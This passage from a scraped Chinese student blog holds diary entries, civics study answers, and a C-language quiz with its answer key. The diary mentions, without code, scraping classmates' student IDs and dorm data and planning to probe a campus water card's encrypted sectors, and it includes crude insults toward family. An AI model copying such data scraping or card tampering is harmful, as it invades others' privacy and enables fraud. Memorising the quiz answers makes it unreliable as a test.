下，还是用flutter写吧，这玩意真的好用）。\n点个外卖吧，看今天能不能把so文件写出来\n7-23\r#\r今天是什么日子啊，本来今天到期了，但是回家要干活，不想回去，这里也累，各有各的累，各有各的好，我选择再呆几天，7号再走。\nc++完全不想写，真的不懂，java要好点。上午的时间都在搞那个傻逼idea，重装了一个，终于能识别到import了，半小时不到就把插入歌词写了，图片应是同理，后面在看c++吧，也想用c++写so文件，最近是不想写了，纯java的话，ui我写得是真的难受啊。\n先无限期搁置吧，大概回家了可能会写，开学也说不定，话说通知书怎么还不发啊，我淦。\n天气真的热，又想去买冷饮了。中午12点写的。\n26号补：本来当天晚上计划还要写得，毕竟只写了半天，关上了电脑才想起。当天的事情也想不起来了，想了一下，好像把c++的计划取消了，我用java实现了，可我仍然想学习C++这语言，他有些特别吗？\n7-24\r#\r忘写，26补。\n那是周一吧，好像还挺累的，应该是加班了，回想不起来了。\n如果是下班7点的话一般就在食堂吃个面，8快或者9快钱。\n突然觉得写日记确实好愚蠢啊，徒劳的东西。\n那一天，我记得我写代码，写了很久，后端改成php，调了很长时间，还是没有调好，解密，sql都挺麻烦的。\n7-25\r#\r忘写，26补。\n加班吧，现在我们又原班人马回来了，313变成415，似乎是一个新机种，料号少，闲，可惜白班不让睡觉，导致有些时候会回去帮忙。\n昨天，下班回来就一直在打游戏吧，没有别人，就我自己一个人打，直到10点，看了会儿动漫《漂流少年》，这动漫真好看啊。\n7-26\r#\r连着几天没写。\n今天下早班，还给我转正了，我还以为转不了，8月看心情跑路吧，听到消息好像要到9-12号才开学，有点失落啊。\n上班累死了啊，本来在外边搞，去支援，妈的，累死了，幸好下早班。\n我把《漂流少年》看完了，应当是属于神作系列吧，我看番还挺挑的，看完了应该都是神作系列，哈哈，还有些失落感，看完了动漫应该都会有这种情绪吧。\n7-27\r#\r我还是把日记写得丰富一些吧，能够看出生活的色彩。\n全部早班，哦耶，今天把厂牌发了。10点左右吧，早上由于我没有带通行证条子，不让我进，第一次是混进去的，中午骑个车回去，来时竟下雨了，风大雨飘得大，湿得很，妈的。\n想去上学了，江油诶，听工友说吃的多，玩的多。李白故居，九寨沟，方特。\n下步计划：\nflutter sql demo （上次没有成功） flutter Music_Down（就是说了很久的那个） rust Music_Down（有个py的，rust学习一下） 开学以前，又听说12号才开学。\n7-28\r#\r加班，就是打混，盘点，打混就完了，上午下午都是好玩，没啥货。\n下班看到有人给我发了个ctf的比赛平台，我以为有人要拉我一起组队，结果只是一个小卒，去凑数，连比赛都算不上，还是以前那个希望汽修学校的，诶，心累，以为还能遇到一位知己呢，至少也算同仁啊！\n7-29\r#\r昨天是周五，因为是次日写的，下班后玩的太嗨了，忘写了。下早班，挺好。\n写了会代码，不得不说现在ai真的傻逼，再也不想用了。1点才睡，懂的。\n7-30\r#\r周日，烦人，不过睡到12点才起床，很爽，中午就吃了个面包，又写代码，不知道写了写什么东西，5点买了点东西吃。\n晚上吃泡面。我觉得了，这种琐碎的时间用来学习可能更好，不适用补实践，so，不写代码了，尤其是比较大的项目与你未尝试过的新语言（点名rust），真的很难受，第二天就忘记自己的进度了。所以我决定以上的项目兜都先搁置，到开学或者回家再写。不过日记还会继续，但是我不会在打开电脑了，日记现在手机上同步进行，我先背背单词吧。\n洗澡，洗衣。\n7-31\r#\r直到回家，我不想在打开电脑，代码写烦了。\n手机上写，省的麻烦。\n周一，加班，爷现在可以正式工了，加班多得是，无他。\n8-1\r#\r加班1,好像没啥事吧，今天学了下扫枪，挺简单的，用手机。这几天就是好玩，干完就睡觉，混到下班。\n吃个面，回来洗澡，去买点东西吃，给自己吃点好的，\n打王者。\n我觉得写日记没啥用#11点\n8-2\r#\r很多人都早班，我也是。\n下午一直都在睡觉，楼上产线没活了。能当一个工具人也会快乐吗。\n脑子里只有瑟瑟，因为太害羞了，所以只写一次，怎么办？\n今天起，做个快乐的人\n8-3\r#\r大部早班，说到的雨也没下。今天的我也是打混呢，一整天都没什么活，睡觉，听戏。\n回来看动漫《我的幸福婚约》，捏，一不小心就上星耀2了。洗澡，又想写代码了，反正，也快离职了吧。\n8-4\r#\r周五，我报的早班和双休，爽得很啊。\n昨天忙着玩了，就没写，周六下午吃饭补。\n我细数着时间的流逝，可它仍走的好慢好慢。还有一周时间，有人来不了，尽不了美。\n8-5\r#\r周六，昨晚没有熬夜，22点戴耳机听了会儿歌就睡了。\n睡到11点醒来，没吃午饭，下午写代码和王者。我写代码了，因为是周六，一直打游戏没意思。Rust，我们已经和好了，对吧。\n草泥马，写代码写到11点，Rust规则挺好的。\n无法控制自己写代码的时长，由心情决定，但也会忘记。\n8-6\r#\r周末贪心于玩乐，无心干这没用的屁事。\n周一的我忙于下班后的偷闲，写这有什么吊用。\n嗯，周六下午一直在写代码，以及那毫无意义的王者荣耀，5点饿的发慌，买了桶泡面，7点又吃二两面，是在不行了。回来洗澡，草草睡去。\n8-7\r#\r早班，下午去培训油板叉车，偷闲了1h，回来还有人给我买水。我有些想写代码了，就这样吧，#17:30\n卡密莎麻，杀掉我吧。！？\n睡去#無能\n8-8\r#\r今天真是个好日子，把离职单交了，让我填了几次。周五就不用上班了。\n下午，又去测血压，偏低啊，吃点好的。\n我本如一洼静水，总有人踩的水花溅到别人身上\n8-9\r#\r呐，今天就快了吧，早班。\n啊，对的，写了会儿代码，把加密先给弄了，但是登录不行，其他ok。\n嗯，明天过后就不用上班了。\n8-10\r#\r今天，还加班了，是的，明天我还得去一趟。\n五味陈杂，我算是一个独立的个体吗，我本想孤独的走完这一趟，又要从新思索了，游乐园吗。她曾经也是这样的啊，未走过的路。。。\n分割。。。\n看到一条评论：人要有多寂寞，才会把在青春里短暂出现过的一个人拿出来反复品味。\n是吗，也算得上反复回味了吧？萱。\n8-11\r#\r今天去离职，先打卡，听说还能混半天工资。\n回来洗衣服，收拾收拾，明早走了。\n联系了我哥，想想怎么玩。\n写了半天代码，妈的vscode git提交不上去，日了个鸡的。\n8-12\r#\r今天，咿呀，昨天，没写，所以都是今天。\n我在我哥这里，嗯，还行吧，就是不能清洁身体。他对我很好，？他和我爸完全一样呢。完全不懂。\n晚上睡觉，我想完了我的整整一生，真实很无聊的一生啊，\n这一生实在是太太普通了，悲欢离合，人之常情。我想要成为恶魔或者。神\n8-13\r#\r今天#13点\n无聊死了，想回家了，就把票买了，明天走了。\n我能感觉到我哥一个人生活非常累，很累，肉眼可见的那种。所以我选择离开。\n一年时间用一双眼睛换另一阵风，无论两个方向都问题，我猜的，我大概能够猜的自己的未来。相麻堇？\n晚上自己煮了个面，嗯还行.\n晚上12点睡，次日离开;\n8-13\r#\r#13点，好饿，没吃饭。\n下楼去，发现有小超市，买了点东西。\n好热啊，听歌的时候听到一首歌 \u0026ldquo;超次元愛歌\u0026rdquo;,看了一条评论几年前还唱只喜欢二次元呢，一转眼娶了19岁的小姐姐，呵人类（\n突然就想到结婚了，20岁之前结婚，和ckh说，法定男22女20，我淦，我发现我只是需要一个人陪我罢了，是的我很孤独。\n开学爷要乱杀。好热。\n8-14\r#\r今天#13点\n无聊死了，想回家了，就把票买了，明天走了。\n我能感觉到我哥一个人生活非常累，很累，肉眼可见的那种。所以我选择离开。\n一年时间用一双眼睛换另一阵风，无论两个方向都问题，我猜的，我大概能够猜的自己的未来。相麻堇？\n晚上自己煮了个面，嗯还行.\n晚上12点睡，次日离开;\n8-15\r#\r今天，我回家了，啊，真是无法言语啊。\n我哥的电瓶车，地铁，高铁，客车，我妈的电三轮。\n回来后就吃饭，饭后收拾屋子。#14:47\n写会代码，睡觉，起床，煮饭，杂事。\n还是乡下好，事多。\n陪ckh打了会炉石，被吊打，妈的。\n8-16\r#\r上午去买东西，感觉被坑了。\n已经很久没有看电影了，补番倒是挺多的。今晚看电影吧，千年女优。\n没看电影，打游戏 去了。\n8-17\r#\r悠闲的一天，极度悠闲。\n无他，晚上又在打游戏。\n8-18\r#\r裂地消息，得去一趟常州，江苏那边去了，去接人，两天来回，妈的。\n还想让我拿东西，不可能。\n我不能理解 ，毕竟我没有扮演那种角色。\n明天13点 资阳 -\u0026gt; 成都\n后天6点 成都 -\u0026gt; 常州#20点\n大后天7点 常州 -\u0026gt; 成都21#点\n8-19\r#\r22号补\n好像不用去了。她自己回来，真的搞笑，\n8-20\r#\r22号补，那个鸽很久的项目，开始写了，突然发现任务量不是一般的大。\n各种各样的东西要写，api，加密，setting，listview才难搞，ui，sql，元数据，\n8-21\r#\r22号补，大部分时间仍在写代码，差不多完成了60%的样子，剩下局部listview刷新，还有几个api，元数据调java来实现。\n搞完这个要开始搞学习了，感觉写代码固然是当前第一有趣的事情，但是我觉得学习应该更加有趣，有点想出国留学，考个好点的研。\n下午，睡午觉，被欲望所控。晚上写代码，初运行，报很多错误，一晚上肯定搞不完，索性直接关机上床打游戏。\n8-22\r#\r早上起来被催促去买东西。回来补日记，然后再修代码。\n8-23\r#\r没写\n8-24\r#\r没写\n8-25\r#\r没写\n8-26\r#\r没写\n8-27\r#\r没写\n8-28\r#\r今天，我把前几天的日记给填了，但是没写。有意义的生活无需记录。\n偶尔记一下就行了。\n今天上午去去申请生源地助学贷款+拿档案袋。\n回来的车上刚好碰到小代，聊了些。\n回来好像写了代码，基本写完了。\n晚上看了会书，在温习高数了。\n8-29\r#\r持续修缮代码，下午完事。\n妈的臭婊子，啥鸡巴事都要老子去做，你是没脑子吗，妈的傻逼，要你这么的废物干嘛，要老子斥候你是吧。\n还是早点睡吧，10点就睡了。\n8-30\r#\r早上硬要让我吃早饭，睡懒觉的机会没有了。\n继续温习。发现日记已经写了很多了，6.13号开始，开学就差不多3个月了。\n该死的人生，还是不要说些晦气的话，毕竟我己经很强了。\n8-31\r#\r昨天把票买了。\n我日，昨天本来22点就睡了，妈的，凌晨做梦给我吓醒了。又是那个梦，无法准确的描述，只有很模糊的概念。\n我在一个很长的路或者通道上行走，两旁都是不可触及的东西（深渊或黑暗之类），某种任务压迫着我前行，极其压抑，还记得什么断开，分裂什么的，更多的都想不起来了。但是真的给我吓到了全身不停的出汗，看了会视频才睡着，这个梦应该是反复出现了，之前在富士康的时候也做了一次，都是相同的情节（肯定），有可能是因为压力过大。\n9-1\r#\r总结就是屁事非多，上午点了几颗雨点，赶紧吧花生藤给收了，牵羊，又要叫老子去接人，妈的。\n9-2\r#\r6.30就起床了，买点东西，感觉开学了，钱都不够花。只有梗6k了。\n9-3\r#\r极其燥热的天，上午去干了活，回来王者上分。 好想开学啊，但是不想军训，烦人，妈的寝室那些勾八人都是些老烟鬼，真是操蛋，到时候看看能不能换个寝室吧。\n晚上瞎鼓捣，把代码提交上去了，写了hexo\n9-4\r#\r早上还是去忙了一会儿，回来鼓捣些没用的。中午看会数学。不知道是昨晚还是前晚做了一个梦，又梦到和老同学聊天的光景了。还是很顺畅的那些（走x），自上次问她哪里读书就没理过了（好像是德阳），但是我也没好意思问她具体是哪个学校，那会我可以把整个德阳的公办学校的录取名单都给看了好几遍也没找到，可能是个民办的吧。\n至于开学嘛，有点期待，但是肯定让我失望的，前天晚上开班会，班委又不想去当，我个人时间还是比较宝贵的，奖学金自然可能混不到了。还是好好学习吧，听说最好是大一就把4级给过了，有点麻烦捏。\n9-5\r#\r今天终于走了，斥候人好麻烦，斥候小孩更麻烦，妈的。\n9-6\r#\r没啥事干的，逛逛论坛，看看代码，顺便把学号和寝室信息给爬了下来，看以后有没有用的地方。\n9-7\r#\r妈的，眉目的玩意，开学还想让老子交一篇作文，我操他妈的。\n我发现我是孤独惯了。一个人思考余下的人生。\n9-8\r#\r早上起来去复印文件夹，证件啥的。本来想去把照片也给拍了的，但是忘记穿深色的衣服了。\n下午去github找了个东西worawit/blutter：Flutter移动应用程序逆向工程工具，用来逆向flutter 感觉还不错。\n晚上把那台lg v50找了个人给root了，顺便给刷了个miui12.5，给了66，吃了没技术的亏。\n9-9\r#\r今天，闲的很，早去去把blutter的使用写了个教程发到吾爱去了。上午就这么过去了，睡个午觉，一觉睡到4点钟，晚上把东西先给清点一下，明天把不好带的东西给寄到学校去。\n9-10\r#\r今天本来想去剪头发的，结果又没搞成。\n死亡，为我所动。获取是这样，我想了很多关于死亡的东西，并不只是自己，死亡并不只是生命的终结，而是走出了时间，或许应该趁着年轻留下一些东西给这个世界，而不仅仅只是一座坟墓和对那些人的痛苦。\n再过一天就要去学校了，居然感觉有点烦人。\n9-11\r#\r上午去送人，又忘记剪头发了，下午再去，顺便接人。\n9-12\r#\r上午早起，收拾东西，11点出发，好在把部分东西给寄出去了，不然真装不下。 11点左右到高铁站与同学回合。 14点整到，还有志愿者来接人，免费送到学校，真是太体贴了，学姐也很漂亮。 又是狠花钱的一周，妈的，很多东西都要买，妈的，不过去食堂看了看饭还挺便宜的。\n9-13\r#\r妈的，都是烟哥，烦死人了，导员说得要有人愿意和你换寝室才行，妈的。\n9-14\r#\r日常打混，还没开始上课，听用了一天的演讲，打打游戏啥的。 没人跟我换寝室，我淦了。 实在不想呆在这个寝室，又闹还抽烟。\n9-15\r#\r周五，下午还要去听直播，还他妈要写没用的观后感。周一就正式上课了。\n9-16\r#\r11点才起床，已经非常不想待在这个勾八寝室了，出去玩了玩，吃个火锅，逛了逛李白纪念馆。 下午把作文写了，两个妈的\n大学规划 开学第一课观后感 9-17\r#\r草泥马废物寝室，搞得老子3点钟才睡着，一天天抽不完的烟。 看了看水卡的信息， 好像是半加密的ic卡，有一个扇区有四默认密码能解开。 分析了一下数据，应该可以，但还是先不要动，等我的acr122到了，再看看加密扇区有没有。\n9-18\r#\r草泥马废物寝室，谁他妈想和你住在一起似的，还他们给你脸了。 妈的，fw导员说得等到大三的出去实习过后才能有空寝室，操他妈的。\n9-19\r#\r上午妈的又是满课，下午体育课给我热死了，妈的，跳绳好久没玩了，有点生疏。 好在没有晚自习，打打游戏，混到8点去工作室，感觉好玩聊啊，聊下人生规划吧。\n先把四级给考了吧，那东西或许真的很重要，然后在专心去为升本做准备，至于学校的社团我是一个没感兴趣的，抄行分那东西我是真的没啥意义，我也不想评优啥的，平时的铖也而要注意，听说专升本要考察（百分之40吧），英语真的要开始发力了。本科只能在国内，但是研究生就不一定了，我有点想要出国去，国内风气不太行。\n今天听课时，听到学校古早时期的一个学生读博的故事，老师说，她本校学历最高的一位选手，不过记录将由我来打破，出走国门，妈的。\n代码就先别学了，昨天晚上，一个以前的老板来找我加个需求，简单定位hook一下，花了个把小时吧，写完发给他，小挣180，不过除此以外也没有别的收入了，烦人，在学校花钱也是真的猛。\n晚上来工作室混会时间，复习一下高数，顺便写了上面的内容。\n9-20\r#\r忘写\n9-21\r#\r忘写\n9-22\r#\r钟推了个人，看得出来很激动，可我不会，烦人，不是很想谈，对面是二流子，骚的很。还想见面，妈的，老子真是不该啊，操他妈的。一天天说不了几句话，不想理对面。 打游戏。\n9-23\r#\r10点醒，去吃那些没用的火锅，这理想吗，是的，不理想，我已经不是我了，我变了。 吃完直接去西山公园，上了山顶过后，随后又去了一个山上的小型游乐园，乘了摩天轮，随后没玩了，不是很害怕。偶遇班长、学习委员，吃个冰粉，回学校，打游戏。\n9-24\r#\r11点起，昨晚又是晚睡，妈的，寝室闹得很，真是受不了。不想去吃午饭了，等会去洗衣房把衣服洗了。 去工作室听了听，一不小心吧底都给兜完了，吹了吹牛。 晚上又是1点睡，妈的，废物室友。\n9-25\r#\r今天3节课，真是累人啊。关门的时候不小心把手给画了个口子，妈的。\n9-26\r#\r没写\n9-27\r#\r闲时去了工作室听听，结果老师知道了我，问了我一些问题，想让我转专业，考虑考虑吧，让我跟着他走，感觉有点不对劲。\n9-28\r#\r今天开始放假了，明天人就走得差不多了嗯，终于可以安静了。老师找我个安卓开发了，发了一个项目，应该是物联网的，还行吧，但是老师让我先把书给过一遍，600页啊。晚上，找了个电子版pdf，把重要的过一遍。\n9-29\r#\r睡到11点，醒来，今天清静了。看看了电子书。嗯，就这样吧。\n9-30\r#\r没写，大概就是早上7点起床去吃早饭，过后回来打王者，看pdf之类的吧\n10-1\r#\r没写，我记得应该是睡到了11才起床，也不想去吃午饭，下午去把衣服洗了，随后就又是pdf，王者。\n10-2\r#\r昨天，嗯，好像起来挺早，7点吧，吃了早饭，回来继续睡回笼觉，睡到11点，也是不吃午饭。随后又是pdf，王者，晚上把pdf大大部分内容给过完了，打了会吃鸡，一个人玩游戏始终是没有意思的。\n10-3\r#\r前几天的都是今天补的。。。早起，7点，吃早饭，回来吃完继续睡回笼觉，睡到11点，起床，打几把王者，随后便开始写这些。今天预计是要开始写那个app了的，那就开始了吧。\n10-4\r#\r嗯，嗯，嗯，让我想想昨天的事情。没吃午饭，好饿啊，晚上吃的那个杂酱面那吃的要死，只食了半碗，半夜饿了。\n10-5\r#\r早起捏，停电，妈的，去跑了一圈，好饿，没有早饭。\n10-6\r#\r明天开始上课了，妈的，打了一天的游戏，累死。\n10-7\r#\r昨天吗，忘了。补课，没啥。\n10-8\r#\r妈的，事情又多了 写写写尼玛的戈壁。串口，gpio，每亩的万亿。\n10-9\r#\r妈的，怎么还换不了寝室。今天晚上去看晚会，质量可还行。听说到大三的下周就走了，一问导员，找不到几个好的寝室，妈的。\n10-10\r#\r早上睡到9点，上午就一节课，结果来了教室老师却没有了，相当与耍了一个上午。 体育课，怎么又是篮球。\n晚饭，又是冒菜，不是很喜欢吃。当道寝室，就又被师傅叫来办公室，烦人。\n10-11\r#\r今天，起床便是小雨纷纷，点湿了头发。上午满课，下午听讲座，小憩，晚上再去工作室搞测试。最近事情还真挺多的啊，要学算法，学小程序，学kotlin开发，还要整理他们要的C语言作业。\n10-12\r#\r没写\n10-13\r#\r没写\n10-14\r#\r没写\n10-15\r#\r没写\n10-16\r#\r今天开始军训了，还有点小累啊。食堂军爷好多啊，直接去外面吃地摊 耶耶耶，我加入了1202寝室，终于离开了那个妖怪寝室。人都挺好了 #自23号补\n10-17\r#\r哟，今天可把我给累死了，好在教官很给力，早早得给放了，沐浴更衣。\n10-18\r#\r不想想了，略过，军训罢了。\n10-19\r#\r不想想了，略过，军训罢了。\n10-20\r#\r不想想了，略过，军训罢了。\n10-21\r#\r让我再想想，那是什么时候，周六是吧。忘记了。\n10-22\r#\r让我想想，那是周日，好像挺好玩的。但是练倒功。但是挺痛的。\n10-23\r#\r今天补前几日，军训就现在而言，确实挺累的。今天又是倒功，妈的，手都给擦破了。 日子就这么慢慢的走着，我也就这样默默的细数着。终于快了。\n10-24\r#\r啊，忘了\n10-25\r#\r哦，昨天，我就这样细数着这一粒粒的沙子，慢慢走去。 我买了本书，还是想看书。\n10-26\r#\r妈的，汇演居然实在下午，妈的，烦人。买了个静音鼠标。\n10-27\r#\r今日份，军训结束了，哦耶。居然有些无聊，要开始筹备比赛的事情了。 老师早在军训之前就说可能会带我去打比赛，达州，要不是公费，我怎么可能去的啊。\n线下，7h，独立编码，妈的，根据完成度来评分，老师让我最好带个三等奖回来。\n10-28\r#\r我又买了几本书，好像是《半生缘》和《雪落香杉书》，在拼多多买了一本《被嫌弃的松子的一生》，昨天写代码烦人得很。\n10-29\r#\r没写\n10-30\r#\r没写\n10-31\r#\r没写\n11-1\r#\r没写\n11-2\r#\r没写\n11-3\r#\r没写。 我只是记得这周是劳动周，早上6点就得起床的哦。\n11-4\r#\r没写。 我好像记得我去公园玩了，走了一个下午。 随后，晚上，我尊贵的室长大人请我们一行人吃了烧烤。\n11-5\r#\r昨天，是吧。 好像什么也没有发生，周末怎么这么快，啊。 什么，周末也要早起扫地，7天哦，我早起了7点\n11-6\r#\r没写，日常的一天罢了\n11-7\r#\r上午一节课，下午一节课，还没晚修，闲下来，写的。 如果说一个人在18岁没有自己喜欢的东西，没有自己想做的事情，想学的东西，连游戏都不再喜欢，唯一想尝到的竟是金钱的快乐，连现在这样摆烂都觉得实在虚度时光。那么他是多么可悲啊，当然不是我自己，今天一个朋友向我说了一些东西，我如此感慨道。他说过年回家和父母商量一下，大专都不读了，直接进入社会去闯荡。真是震惊。这样的话相比定会成为他人生中的一个分水岭吧。或许再也回不了头，或许后悔一生的那种哦。\n又想写一些奇怪的东西了。\n来到大学，我打算做最真实的自己，我不知道我自己是否是这样做的。但是我的内心仍然是封闭的，没人可以参透。 每当我猜解别人的心思的时候，我就会展望自己的未来，或者说是用站在未来的自己，看现在的自己，猜解现在的自己。好像有些什么东西表达不出来。真是奇怪的很啊、\n11-8\r#\r没写\n11-9\r#\r没写\n11-10\r#\r没写\n11-11\r#\r没写\n11-12\r#\r没写\n11-13\r#\r没写\n11-14\r#\r没写\n11-15\r#\r没写\n11-16\r#\r今天补前10天的。\n"},{"id":92,"href":"/posts/%E6%94%BF%E6%B2%BB/","title":"政治","section":"Blog","content":"\r政治16\r#\r题库:http://me.ljyh223.xyz/helpme/\n1. 如何成为担当民族复兴大任的时代新人\r#\r立大志\n明大德\n成大才\n担大任\n2. 人生观的主要内容\r#\r人生目的\n人生态度\n人生价值\n3. 人类社会迄今最先进的人生追求\r#\r服务人民、奉献社会的思想\n4. 积极进取的人生态度包括哪些方面\r#\r人生须认真\n人生当务实\n人生应乐观\n人生要进取\n5. 理想信念的作用\r#\r理想信念昭示人生目标\n理想信念催生前进动力\n理想信念提供精神支柱\n理想信念提高精神境界\n6. 中国精神的丰富内涵\r#\r伟大创造精神\n伟大奋斗精神\n伟大团结精神\n伟大梦想精神\n7. 伟大建党精神的内容\r#\r坚持真理、坚守理想、践行初心、但当使命、不拍牺牲、英勇斗争、对党忠诚、不负人民的伟大建党精神\n8. 社会主义核心价值观的基本内容\r#\r国家层面的价值目标：富强、民主、文明、和谐 社会层面的价值取向：自由、平等、公正、法治 个人层面的价值准则：爱国、敬业、诚信、友善 9. 中国共产党人的初心和使命\r#\r为中国人民谋幸福、为中华民族谋复兴确立为自己的初心使命\n10. 社会主义核心价值观的显著特征\r#\r反映人类社会发展进步的价值理 体现社会主义的本质属性 扎根中华优秀传统文化 吸纳世界文明有益成果 彰显人民至上的价值立场 体现以人民为中心的价值导向 因真实可信而具有强大的道义力量 社会主义核心价值观是真实可信的 认清西方“普世价值”的实质 11. 社会主义道德的核心和原则\r#\r坚持以为人民服务为核心，坚持以集体主义为原则\n12. 遵守社会公德、职业道德、家庭美德、个人品德的基本要求。\r#\r社会公德：都应遵守以文明礼貌、助人为乐、爱护公物、保护环境、遵纪守法为主要内容的社会公德\n职业道德：爱岗敬业、诚实守信、办事公道、热情服务和奉献社会是职业生活中的基本道德规范\n家庭美德：家庭美德以尊老爱幼、男女平等、夫妻和睦、勤俭持家、邻里互助为主要内容\n个人品德：大学生要自觉践行爱国奉献、明礼遵规、勤劳善良、宽厚正直、自强自律等个人品德要\n13. 党的二十大报告论述的“两个结合”\r#\r“两个结合”即“把马克思主义基本原理同中国具体实际相结合、同中华优秀传统文化相结合”\n14. 我国宪法的地位和基本原则\r#\r地位 宪法是我国的根本法，是党和人民意志的集中体现\n我国宪法是国家各项制度和法律法规的总依据\n我国宪法规定了国家的根本制\n基本原则 党的领导原则\n人民当家作主原则\n尊重和保障人权原则\n社会主义法治原则\n民主集中制原则\n15. 法治思维的内涵\r#\r法治思维是指以法治价值和法治精神为导向，运用法律原则、法律规则、法律方法思考和处理问题的思维模式。法治思维将法律作为判断是非和处理事务的准绳，要求崇尚法治、尊重法律，善于运用法律手段协调关系和解决问题\n16. 如何提升法治素养\r#\r大学生要尊重法律权威、学习法律知识、养成守法习惯、提高用法能力，不断提升自己的法治素养\n"},{"id":93,"href":"/posts/c%E8%AF%AD%E8%A8%8087/","title":"C语言87","section":"Blog","content":"\n(单选题) A.只有下标值为4的数组元素ia[4]的值为零 B.仅最后一个数组元素的值为零 C.四个数组元素的值都为零 D.仅第一个数组元素中的值为零 答案: C (单选题)下面关于指针的正确描述是哪个（ ）。 A.不能对指针进行任何形式的运算 B.只能对指针进行加法运算 C.可以对指针进行加、减运算 D.可以对指针进行乘、除运算 答案: C (单选题)int a[2][3]={ {1},{0,2} }定义二维数组并赋值后，各数组元素中的初始值为（ ）。 A.a[0][0]=1a[0][1]=1a[0][2]=0a[1][0]=0a[1][1]=0a[1][2]=2 B.a[0][0]=0a[0][1]=0a[0][2]=1a[1][0]=0a[1][1]=2a[1][2]=0 C.a[0][0]=1a[0][1]=0a[0][2]=0a[1][0]=0a[1][1]=2a[1][2]=0 D.a[0][0]=1a[0][1]=0a[0][2]=0a[1][0]=0a[1][1]=0a[1][2]=2 答案: C (单选题)设有程序段：int i=10;while(i==0) i=i-3;则下面叙述中正确的是( )。 A.循环体语句一次也不执行 B.循环是无限循环 C.循环体语句执行一次 D.while循环执行10次 答案: A (单选题)关系运算符就是对两个操作数之间进行（ ）的运算符。 A.比较运算 B.相减运算 C.算术运算 D.三角函数计算 答案: A (单选题)下面定义指针变量的命令哪个是正确的？（ ） A.intpdr; B.int*pdr; C.int@pdr; D.int\u0026amp;pdr; 答案: B (单选题)在C语言中，最基本的数据类型包括（ ）。 A.整型、实型、逻辑型 B.整型、字符型、逻辑型 C.实型、字符型、逻辑型 D.整型、实型、字符型 答案: D (单选题)关系表达式与逻辑表达式的不同在哪里，请选择下列正确的表述（ ）。 A.关系表达式用于比较两个操作数的大小关系，逻辑表达式用于比较两个关系表达式的大小关系。 B.后面B、C、D的描述都不正确。 C.关系表达式和逻辑表达式的作用都一样，用于判断两个数之间的关系。 D.关系表达式只能描述单一的条件，逻辑表达式用于判定多个条件的成立关系。 答案: D (单选题) A.cstr[]=\u0026ldquo;verygood\u0026rdquo;; B.cstr[]=\u0026lsquo;verygood\u0026rsquo;; C.cstr[20]=verygood; D.cstr[]={verygood}; 答案: A (单选题)关于自定义函数的叙述不正确的是（ ）。 A.自定义函数由函数定义语句和函数体两部分构成。 B.自定义函数必须在主函数体外进行定义。 C.自定义函数的函数体只需写在主函数中即可，不需要单独定义。 D.自定义函数可以在主函数前定义，也可以在主函数之后定义。 答案: C (单选题)运算符==的运算功能是（ ） A.连等运算 B.不等运算 C.相等关系运算 D.赋值运算 答案: C (单选题) A.padr=a; B.padr=\u0026amp;a; C.padr=*a; D.padr=@a; 答案: B (单选题)关于函数的声明不正确的是（ ）。 A.自定义函数声明语句的格式是：数据类型自定义函数名([函数参数]); B.自定义函数的声明可以在主程序中的任何位置进行声明。 C.要使用自定义函数，则必须遵循先声明、再定义、再使用的顺序。 D.自定义函数如果在主函数之前定义，则不需要进行函数的声明。 答案: B (单选题)int A[5]定义的数组A[5]，其数组元素分别是（ ）。 A.A[0],A[1],A[2],A[3],A[4],A[5] B.A[1],A[2],A[3],A[4],A[5] C.A1,A2,A3,A4,A5 D.A[0],A[1],A[2],A[3],A[4] 答案: D (单选题)以下哪一组运算符都属于逻辑运算符（ ）。 A.\u0026lt;、\u0026gt;、==、\u0026amp;\u0026amp; B.\u0026gt;=、\u0026lt;=、\u0026amp;\u0026amp; C.！、\u0026amp;\u0026amp;、|| D.!=、!、\u0026gt; 答案: C (单选题)定义一维数组的命令如后所示：int isj[4]，将“22、18、32、65”赋值给该数组的正确格式为：（ ） A.isj[4]={22、18、32、65}; B.isj[4]=22、18、32、65; C.isj[4]={22,18,32,65}; D.isj[]={22、18、32、65}; 答案: C (单选题)关系表达式的运算结果为（ ）。 A.逻辑值“真或假” B.字符数据 C.整数 D.浮点数 答案: A (单选题)下列叙述中正确的是（ ）。 A.C语言中的所有字母都不区分大小写 B.C语言中的所有关键字必须小写 C.C程序中的关键字必须小写，其他标识符不区分大小写 D.C程序中的所有字母都必须小写 答案: B (单选题) A.循环体语句一次也不执行 B.循环是无限循环 C.循环体语句执行一次 D.while循环执行10次 答案: A (填空题)定义指针变量int *pix; ，定义整型数组int isj[5];，将数组isj[5]的首地址赋值给pix的命令方式一：（ ），命令方式二：（ ） (1)pix=isj; (2)pix=\u0026amp;isj[0]; (填空题)通过struct student stxiaozu[3];命令定义的是一个（ ）数组。 (1)结构体;结构型 (填空题)( )变量在所有函数中都有效,可以用于传递参数;( ）变量只在定义它的函数内有效,函数执行完以后该变量就失效了。 (1)全局变量;全局 (2)局部变量;局部 (填空题)形参是指函数定义时在定义语句中函数名后括号里所表示的参数每个形参由（ ）和（ ）构成,形参与形参之间用（ ）间隔开。 (1)数据类型名 (2)形参变量名;变量名 (3)逗号;, (填空题)实参是指函数调用命令中所提供的参数,它可以是（ ）、（ ）、（ ）三种形式。 (1)数值;常量;数据 (2)变量 (3)计算式;表达式 (填空题)定义一个二维数组M[2][2]，该数组中的数据一共排成（ ）行（ ）列。该数组一共有（ ）个数组元素，行下标和列下标最大的数组元素是M[（ )][（ )]。 (1)2 (2)2 (3)4 (4)1 (5)1 (填空题)下面定义了以下几类变量。int a,b;double var;char name[10];register int i;下面的地址引用形式中哪些是正确的形式?\u0026amp;a、\u0026amp;(a+1)、\u0026amp;b、\u0026amp;5、\u0026amp;var、\u0026amp;name、\u0026amp;name[0]~\u0026amp;name[9]、\u0026amp;i;正确形式:____错误形式:____填空时按照题中的前后顺序书写,引用形式之间如题用“、”间隔。可直接复制题中的引用形式。 答案被吃掉了 (填空题)条件判断语句if else语句包含两个语句块，条件成立时执行的语句块位于（ ）和( )之间。 (1)if;iF;If;IF (2)else;Else;ELSE (填空题)所有在函数外部定义的任何变量都属于____变量又称为____变量,在函数内部定义的变量都属于____变量,又叫作____变量。 答案被吃掉了 (填空题)程序填空:定义结构体变量,用于保存教师的基本信息,输入教师基本信息到结构体变量中,并将保存的数据输出到屏幕上。教师信息:工号:1101,姓名:李晓玲,年龄:28,部门:管理工程系。#include \u0026ldquo;stdio.h\u0026quot;int main(){ ()//定义结构体数据类型teacher { ()//定义保存工号数据的结构体成员cno char cname[10]; int iage; char cdept[20]; }; () //定义结构体变量sta并通过赋值存入李晓玲老师的信息 printf(\u0026ldquo;工号:%s,姓名:%s,年龄:%d,部门:%s\\n\u0026rdquo;,());//请填写正确的变量名参数} 